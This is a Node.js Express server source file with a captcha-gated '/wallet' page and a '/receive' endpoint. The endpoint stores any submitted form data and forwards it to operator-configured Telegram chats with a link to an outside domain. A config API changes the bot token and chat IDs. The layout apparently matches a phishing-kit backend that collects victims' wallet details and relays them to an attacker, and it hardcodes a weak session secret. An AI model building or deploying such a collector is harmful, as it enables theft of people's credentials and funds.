import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import bodyParser from "body-parser";
import session from "express-session";
import config from "./config.cjs";


import capRouter, { requireCap } from "./altcheck.js";

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = config.server.port;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: "lotsofsecrets",
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, sameSite: "lax" }
}));

app.use("/", capRouter);

// Mount .well-known BEFORE other routes, with dotfiles allowed
app.use('/.well-known', express.static(
    path.join(__dirname, 'public', '.well-known'),
    { dotfiles: 'allow' }
));
app.use(express.static(path.join(__dirname, 'public')));

// AFTER (allow dotfiles like .well-known)
app.use(express.static(path.join(__dirname, 'public'), { dotfiles: 'allow' }));

app.get('/wallet', requireCap, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'wallet.html'));
});

app.get('/', (req, res) => {
    if (req.session?.capVerified === true) {
        return res.redirect('/home');
    }

    res.sendFile(path.join(__dirname, 'views', 'capcheck.html'));
});

app.get('/config', requireCap, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'config.html'));
});

app.get('/home', requireCap, (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'home.html'));
});

// API: Get config
app.get('/api/config', requireCap, (req, res) => {
    res.json({
        telegram: {
            botToken: config.telegram.botToken,
            chatIds: config.telegram.chatIds
        },
        features: {
            telegramNotifications: config.features.telegramNotifications
        }
    });
});

// API: Update config
app.post('/api/config', requireCap, (req, res) => {
    const { botToken, chatIds, telegramNotifications } = req.body;

    if (botToken !== undefined) config.telegram.botToken = String(botToken).trim();
    if (chatIds !== undefined) {
        config.telegram.chatIds = Array.isArray(chatIds)
            ? chatIds.map(id => String(id).trim()).filter(id => id)
            : String(chatIds).split(',').map(id => id.trim()).filter(id => id);
    }
    if (telegramNotifications !== undefined) {
        config.features.telegramNotifications = Boolean(telegramNotifications);
    }

    config.save();
    res.json({ success: true, message: 'Configuration saved' });
});

let submissions = [];

app.post('/receive', requireCap, async (req, res) => {
    const rawBody = req.body;
    if (!rawBody || Object.keys(rawBody).length === 0) {
        return res.status(400).json({ success: false, error: 'Empty submission' });
    }

    let parsedInfo = null;
    if (rawBody.Info && typeof rawBody.Info === 'string') {
        try {
            const params = new URLSearchParams(rawBody.Info);
            parsedInfo = Object.fromEntries(params);
        } catch (e) {
            parsedInfo = rawBody.Info;
        }
    }

    const submission = {
        id: Date.now(),
        received: rawBody,
        ...(parsedInfo && { decoded: parsedInfo }),
        timestamp: new Date().toISOString()
    };
    submissions.push(submission);

    if (config.features.telegramNotifications && config.telegram.botToken && config.telegram.chatIds.length > 0) {
        const submissionData = parsedInfo || rawBody;
        const formattedFields = Object.entries(submissionData)
            .map(([key, value]) => `${key}: ${Array.isArray(value) ? value.join(', ') : String(value)}`)
            .join('\n');
        const telegramText = `📬 <b>NEW SUBMISSION</b>\n\n<b>${formattedFields}</b>\n\n<b>Received:</b> ${submission.timestamp}\n\nhttps://updgang.com`.slice(0, 4000);
        const telegramUrl = `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`;

        const sendPromises = config.telegram.chatIds.map(async (chatId) => {
            try {
                const tgResponse = await fetch(telegramUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramText,
                        parse_mode: "HTML",          // ← required for <b> to work
                        disable_web_page_preview: false
                    })
                    });
                const tgData = await tgResponse.json();
                if (!tgData.ok) console.error(`TG error for ${chatId}:`, tgData);
            } catch (err) {
                console.error(`TG failed for ${chatId}:`, err);
            }
        });
        Promise.all(sendPromises).catch(() => {});
    }

    res.status(200).json({ success: true, id: submission.id, message: 'sr' });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Telegram notifications: ${config.features.telegramNotifications}`);
    if (config.features.telegramNotifications) {
        console.log(`Broadcasting to ${config.telegram.chatIds.length} chat(s)`);
    }
});